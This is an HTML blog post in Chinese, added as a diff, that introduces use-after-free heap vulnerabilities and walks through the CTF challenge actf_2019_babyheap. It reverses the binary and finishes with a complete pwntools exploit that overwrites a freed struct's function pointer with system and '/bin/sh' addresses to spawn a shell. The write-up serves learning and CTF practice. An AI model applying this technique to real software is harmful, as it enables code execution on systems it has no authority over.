@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.1","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="UAF漏洞漏洞简介UAF —— Use After Free：其内容如同其名称，free后进行再利用。UAF是堆结构漏洞的一种重要的利用方式。在程序中，UAF常有以下几种情况：  内存块被释放后，其对应的指针被设置为 NULL，然后再次使用，自然程序会崩溃。 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UAF初识">
+<meta property="og:url" content="http://example.com/2025/06/17/UAF%E5%88%9D%E8%AF%86/index.html">
+<meta property="og:site_name" content="PWN好难学">
+<meta property="og:description" content="UAF漏洞漏洞简介UAF —— Use After Free：其内容如同其名称，free后进行再利用。UAF是堆结构漏洞的一种重要的利用方式。在程序中，UAF常有以下几种情况：  内存块被释放后，其对应的指针被设置为 NULL，然后再次使用，自然程序会崩溃。 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125909010.png">
+<meta property="og:image" content="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125909023.png">
+<meta property="og:image" content="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125933334.png">
+<meta property="og:image" content="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125908994.png">
+<meta property="og:image" content="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125909026.png">
+<meta property="og:image" content="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125909051.png">
+<meta property="og:image" content="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125909868.png">
+<meta property="og:image" content="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125909903.png">
+<meta property="og:image" content="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125909995.png">
+<meta property="og:image" content="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125910149.png">
+<meta property="og:image" content="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125910148.png">
+<meta property="article:published_time" content="2025-06-17T05:04:54.000Z">
+<meta property="article:modified_time" content="2025-06-17T05:11:53.993Z">
+<meta property="article:author" content="Fa1lSnow">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="UAF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125909010.png">
+
+
+<link rel="canonical" href="http://example.com/2025/06/17/UAF%E5%88%9D%E8%AF%86/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2025/06/17/UAF%E5%88%9D%E8%AF%86/","path":"2025/06/17/UAF初识/","title":"UAF初识"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>UAF初识 | PWN好难学</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">PWN好难学</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"> 落雪的小玩意</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#UAF%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">UAF漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90"><span class="nav-number">1.2.</span> <span class="nav-text">例题分析</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Fa1lSnow"
+      src="/uploads/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Fa1lSnow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/06/17/UAF%E5%88%9D%E8%AF%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+      <meta itemprop="name" content="Fa1lSnow">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="PWN好难学">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="UAF初识 | PWN好难学">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          UAF初识
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2025-06-17 13:04:54 / Modified: 13:11:53" itemprop="dateCreated datePublished" datetime="2025-06-17T13:04:54+08:00">2025-06-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><meta name="referrer" content="no-referrer" />
+
+<h1 id="UAF漏洞"><a href="#UAF漏洞" class="headerlink" title="UAF漏洞"></a>UAF漏洞</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>UAF —— Use After Free：其内容如同其名称，free后进行再利用。UAF是堆结构漏洞的一种重要的利用方式。<br>在程序中，UAF常有以下几种情况：</p>
+<ul>
+<li>内存块被释放后，其对应的指针被设置为 NULL，然后再次使用，自然程序会崩溃。</li>
+<li>内存块被释放后，其对应的指针<strong>没有被设置为 NULL</strong> ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。</li>
+<li>内存块被释放后，其对应的指针<strong>没有被设置为 NULL</strong>，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。<br>而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。<blockquote>
+<p>Dangling Pointer（悬挂指针、悬空指针、迷途指针）是计算机编程中的一个常见且危险的问题，它指的是一个指针仍然保留着之前指向的内存地址，但是这片内存区域可能已经被释放或者不再有效，从而可能导致程序在使用该指针时出现未定义行为。</p>
+</blockquote>
+</li>
+</ul>
+<p>下面我将通过一道简单的例题展示一下UAF的攻击。</p>
+<h2 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h2><blockquote>
+<p>题目来源：actf_2019_babyheap（UAF）</p>
+</blockquote>
+<p>拿到题先检查保护信息，然后运行一下。<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125909010.png" alt="image"><br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125909023.png" alt="image"><br>这是一道菜单题，没有开启PIE。<br>然后用ida反编译一下，定位到 main函数。<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125933334.png" alt="image-20250617125933275"><br>经过我们的逆向之后，代码是这个样子的。<br>main函数：<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125908994.png" alt="image"><br>menu函数：<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125909026.png" alt="image"><br>可以看到该函数调用了system函数，我们再检索一下字符串，发现了<code>/bin/sh</code>。<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125909051.png" alt="image"><br>由于这道题没有开启PIE，所以<code>system</code>函数的地址和<code>/bin/sh</code>的地址我们就取得了，后续可能会有用。<br>creat:<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125909868.png" alt="image"><br>creat函数先是malloc了一个0x10大小的堆块，然后<strong>把用户malloc的堆块的地址和print_context的地址</strong>存入该堆块。<br>print_content：<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125909903.png" alt="image"><br>delete：<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125909995.png" alt="image"><br>可见delete函数中再free掉堆块之后并没有将指针设置为NULL，说明程序中可能存在UAF漏洞。<br>show：<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125910149.png" alt="image"><br>可以看到，show函数是通过调用函数指针来输出数据的，而这个函数的地址储存在<strong>ptr[index][2]处</strong>，参数储存在<strong>ptr[index][1]处</strong>。<br>那么思路就十分明确了。我们可以先创造2个任意大小的堆块（远离0x10即可），然后free掉他们。然后再创建一个0x10（或者0x18）大小的堆块，通过修堆块的内容为<code>binsh_addr</code>和<code>system_addr</code>然后再执行show(0)就可以了。说的可能有点晦涩难懂，以下是具体解释。<br>在我们申请两个堆块之后，大致情况如下。<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617125910148.png" alt="image"><br>然后我们再把这两个堆块free掉，再次申请0x10（0x18）大小的堆块。<br>此时由于堆管理机制，我们申请得到的<strong>struct3就是原来的struct2，content的堆块就是原来的struct1</strong>（后入先出），这样我们就可以把原来的content地址改为binsh的地址，print_content的地址改为system的地址，然后再show(0)就能够getshell（struct1的index为0)。<br>那么具体的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please input size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Please input content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please input list index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please input list index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    context(log_level=<span class="string">&#x27;debug&#x27;</span> , os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">    pwnfile = <span class="string">&#x27;./uaf&#x27;</span></span><br><span class="line">    p = process(pwnfile)</span><br><span class="line">    elf = ELF(pwnfile)</span><br><span class="line">	</span><br><span class="line">    sys_addr = <span class="number">0x4007A0</span></span><br><span class="line">    binsh_addr = <span class="number">0x602010</span></span><br><span class="line">	</span><br><span class="line">    create(<span class="number">0x100</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">    create(<span class="number">0x100</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    create(<span class="number">0x10</span>, p64(binsh_addr) + p64(sys_addr))</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/heap/" rel="tag"># heap</a>
+              <a href="/tags/UAF/" rel="tag"># UAF</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/06/17/Unlink/" rel="prev" title="Unlink">
+                  <i class="fa fa-angle-left"></i> Unlink
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/06/17/SROP/" rel="next" title="SROP">
+                  SROP <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Fa1lSnow</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
